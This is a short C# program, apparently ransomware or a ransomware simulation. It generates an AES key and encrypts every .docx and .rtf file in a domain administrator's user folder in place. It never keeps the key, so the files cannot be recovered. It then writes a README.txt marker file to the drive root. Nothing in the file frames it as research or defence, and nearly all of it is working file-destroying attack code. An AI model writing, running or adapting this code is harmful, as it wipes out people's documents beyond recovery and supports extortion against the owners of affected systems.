using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class EncryptionScript
{
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, ref IntPtr phKey);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);

    public static void Main()
    {
        string directoryPath = @"C:\Users\domain.admin";
        string readmeFilePath = @"C:\README.txt";
        string encryptionKey;

        // Generate encryption key
        using (Aes aes = Aes.Create())
        {
            aes.GenerateKey();
            encryptionKey = Convert.ToBase64String(aes.Key);
        }

        EncryptFiles(directoryPath, encryptionKey);
        WriteReadmeFile(readmeFilePath);
    }

    public static void EncryptFiles(string directoryPath, string encryptionKey)
    {
        DirectoryInfo directory = new DirectoryInfo(directoryPath);

        foreach (var file in directory.GetFiles("*.docx"))
        {
            EncryptFile(file.FullName, encryptionKey);
        }

        foreach (var file in directory.GetFiles("*.rtf"))
        {
            EncryptFile(file.FullName, encryptionKey);
        }
    }

    public static void EncryptFile(string filePath, string encryptionKey)
    {
        try
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Convert.FromBase64String(encryptionKey);

                // Encrypt the file contents
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(fileBytes, 0, fileBytes.Length);
                        cryptoStream.FlushFinalBlock();

                        // Update the encrypted contents
                        byte[] encryptedBytes = memoryStream.ToArray();
                        File.WriteAllBytes(filePath, encryptedBytes);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error encrypting file '{filePath}': {ex.Message}");
        }
    }

    public static void WriteReadmeFile(string readmeFilePath)
    {
        try
        {
            File.WriteAllText(readmeFilePath, "done");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error writing README file: {ex.Message}");
        }
    }
}
